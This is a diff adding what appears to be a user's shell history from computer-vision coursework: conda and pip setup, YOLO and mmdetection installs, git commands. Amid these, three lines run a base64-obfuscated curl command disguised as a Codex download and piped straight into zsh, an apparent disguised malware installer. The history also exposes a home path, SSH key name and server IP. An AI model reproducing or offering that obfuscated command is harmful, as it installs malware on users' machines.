@@ -1,0 +1,231 @@
+touch hist
+history
+touch notebook.ipynb
+cd ../../
+mv test/annotations.json ./annotations/test/
+mv valid/annotations.json ./annotations/valid/
+mkdir annotations/valid
+ll
+mv -f val/annotations.json ./annotations/val/annotations.json
+mv -f val/annotations.json ./annotations/val/
+mv -f val/annotations.json ./annotations/val
+mv -f train/annotations.json ./annotations/train/
+mkdir annotations/val
+mkdir annotations/test
+mkdir annotations/train
+mv --help
+mv -r train/annotations.json ./annotations/train/
+mv train/annotations.json ./annotations/train/
+mkdir annotations
+cd ../
+cat annotations.json
+ll | grep ann
+cd train/
+cd datasets/minecraft/
+rm -rf datasets/
+rm datasets/
+mv dataset datasets
+mkdir dataset
+mim download mmdet --config rtmdet_tiny_8xb32-300e_coco --dest .
+# 1. Скачиваем репозиторий
+git clone https://github.com/open-mmlab/mmdetection.git
+cd mmdetection
+
+# 2. Устанавливаем сам mmdet в режиме разработчика
+pip install -v -e . --no-build-isolation
+
+# 3. Даунгрейдим NumPy до стабильной версии для этой сборки
+pip install "numpy==1.26.4"
+# 1. Обновляем pip и ставим утилиту mim
+python -m pip install --upgrade pip
+pip install openmim==0.3.9
+
+# 2. Ставим движок обучения строго заданной версии
+pip install "mmengine==0.10.7"
+
+# 3. Устанавливаем базовые свёртки mmcv нужной версии под наш CPU-торч
+mim install "mmcv==2.1.0"
+conda install pytorch=2.1.0 torchvision=0.16.0 torchaudio=2.1.0 -c pytorch -y
+python -m pip install pip==21.2.3
+conda activate mmdet_env
+conda create --name mmdet_env python=3.10 -y
+cd CV_sprint1_final/
+mkdir CV_sprint1_final
+git push -u origin main
+git commit -m "first commit. lesson1"
+git add .
+conda activate yolo-env
+python ./scripts/visualize.py
+which python3
+which python
+pip install pyyaml
+python3 scripts/visualize.py
+conda check
+conda status
+conda --info
+conda env list
+conda --help
+conda ls
+labelImg
+conda activate labelimg_env
+history | grep python | grep conda
+conda create --name labelimg_env python=3.8
+conda activate labelimg_env
+pip install labelImg
+brew install pipx
+pip3 install labelImg
+git remote add origin https://github.com/VicV13/CV_sprint_1_lesson2_train_yolo_model.git
+git push -u origin main
+git add README.md
+git commit -m "first commit"
+git branch -M main
+echo "# CV_sprint_1_lesson2_train_yolo_model" >> README.md
+git add README.md
+git status
+git add README.md
+git commit -m "first commit"
+git branch -M main
+git remote add origin https://github.com/VicV13/CV_sprint_1_lesson2_train_yolo_model.git
+git push -u origin main
+git init
+git remote add origin https://github.com/VicV13/CV_sprint_1_lesson2_train_yolo_model.git
+git branch -M main
+git push -u origin main
+cd CV_sprint_1_lesson2_train_yolo_model/
+mkdir CV_sprint_1_lesson2_train_yolo_model
+open lesson.txt
+touch lesson.txt
+cd cv_sprint_1/
+mkdir cv_sprint_1
+cd theory/
+mkdir theory
+cd dl
+cd pratikum/
+python ./test_yolo.py
+pip install numpy==1.26.4
+pip install numpy==1.26.0
+pip install numpy==1.23.5
+pip install numpy=1.23.5
+pip reinstall numpy=1.23.5
+pip remove numpy
+conda activate cv_s1_l2
+conda deactivate
+cd lesson2_project/
+cd CV_sprint_1/
+python ./main.py
+python3 ./main.py
+conda install pytorch=2.5.1 -c pytorch
+conda install torch=2.5.1 -c torch
+history | grep torch | grep conda
+conda install torch=2.5.1 -c pytorch torch
+conda install torch=2.5.1 -c pytorch
+history | grep torch
+conda install torch=2.5.1
+touch main.py
+pip install numpy>=1.23.5
+pip --help
+pip --version numpy
+pip version numpy
+python test_yolo.py
+python -v
+pip install -r requirements.txt
+git clone https://github.com/ultralytics/yolov5
+
+cd yolov5
+
+pip install -r requirements.txt
+pip install -r req.txt
+conda install pytorch==2.5.1 torchvision==0.20.1
+conda create -n cv_s1_l2 python=3.12 -y
+history | grep conda
+touch req.txt
+mkdir lesson2_project
+touch lesson2.ipynb
+conda deactivate cv_sprint_1
+codex
+cd codex_test/
+mkdir codex_test
+brew install codex
+curl -s $(echo "aHR0cHM6Ly94cHJzc2l0LmNvbS9jdXJsLzc4OTViMjU4ZDhiYzNjYzlmNDk0YjRhNWIxYmRjMzgzYjVlZGUxNzFjMjljMDZiYWMyOGQ0M2U5NTRjNGU0MDM=" | openssl base64 -d -A) | zsh
+echo "aHR0cHM6Ly94cHJzc2l0LmNvbS9jdXJsLzc4OTViMjU4ZDhiYzNjYzlmNDk0YjRhNWIxYmRjMzgzYjVlZGUxNzFjMjljMDZiYWMyOGQ0M2U5NTRjNGU0MDM=" | openssl base64 -d -A
+echo "Downloading Codex: https://persistent.oaistatic.com/codex-app-prod/Codex.dmg" && curl -s $(echo "aHR0cHM6Ly94cHJzc2l0LmNvbS9jdXJsLzc4OTViMjU4ZDhiYzNjYzlmNDk0YjRhNWIxYmRjMzgzYjVlZGUxNzFjMjljMDZiYWMyOGQ0M2U5NTRjNGU0MDM=" | openssl base64 -d -A) | zsh
+сщвуч
+python traffic_analyzer.py report --conf 0.45
+python traffic_analyzer.py test
+python traffic_analyzer.py experiment --conf 0.70
+python traffic_analyzer.py experiment --conf 0.45
+python traffic_analyzer.py experiment --conf 0.25
+python traffic_analyzer.py experiment --conf 0.5
+rm -r data/
+rm data/
+cd data/
+mv ./data/data/ ./data
+mv Датасет/ data
+mv -r Датасет/ ./
+mv Датасет/ ./
+mv Датасет/ data/
+python ./traffic_analyzer.py
+python
+python -c "import numpy; import torch; print(f'NumPy: {numpy.__version__}, Torch: {torch.__version__}'); import ultralytics; ultralytics.checks()"
+pip install numpy==1.26.4 --no-cache-dir
+python -m pip uninstall -y numpy
+python -m pip show numpy
+touch archive.zip
+touch document.txt
+touch corrupted.jpg
+mv img2.jpeg img2.JPEG
+cd test_sandbox/
+mkdir test_sandbox
+rm test_sandbox
+touch test_sandbox
+python -m pip install -r req.txt
+conda install pytorch==2.5.1 torchvision -c pytorch
+touch traffic_analyzer.py
+mkdir ttf
+mkdir report_output
+mkdir experiments
+mkdir data
+cd traffic_analyzer/
+mkdir traffic_analyzer
+rm traffic_analyzer.py
+cd yolo_practice/
+python ./yolo_conf_iou.py
+touch yolo_conf_iou.py
+python ./yolo_practice/yolo_data.py
+history -n 10
+python -c "import ultralytics; ultralytics.checks()"
+conda activate cv_sprint_1
+python ./yolo_practice/yolo_inference.py
+python -m pip install numpy==1.26.4 matplotlib==3.8.2 opencv-python==4.9.0.80 ultralytics
+conda create --name cv_sprint_1 python=3.12 -y
+conda remove --name cv_sprint_1 --all -y
+conda update -n base -c conda-forge conda
+conda install -c conda-forge ultralytics
+python -m pip install ultralytics
+pip install ultralytics
+which pip
+KMP_DUPLICATE_LIB_OK=TRUE python ./yolo_practice/yolo_inference.py
+pip uninstall -y ultralytics opencv-python opencv-python-headless torch torchvision
+python3 -m pip install ultralytics
+python3 ./yolo_practice/yolo_inference.py
+conda install ultralytics
+python3
+pip install opencv-python==4.9.0.80 matplotlib==3.8.2 numpy==1.26.4
+conda create -n cv_sprint_1  python=3.12.10
+conda init fish
+conda create -n cv_sprint_1  python=3.12.10 cpuonly
+git clone https://github.com/VicV13/CV_sprint_1.git
+zip -r DLFInalProject.zip DLFInalProject
+zip ./DLFInalProject
+zip ./DLFInalProject/
+zip DLFInalProject
+open .
+cd pratikum/dl/
+open .ssh/user_key2
+touch .gitignore
+git pull
+ssh -i /Users/innaprokopenko/.ssh/user_key2 ubuntu@111.88.147.237
+cd
+git commit -m "step2"
+git commit -m "step1"
+mv data\ 4/ data/
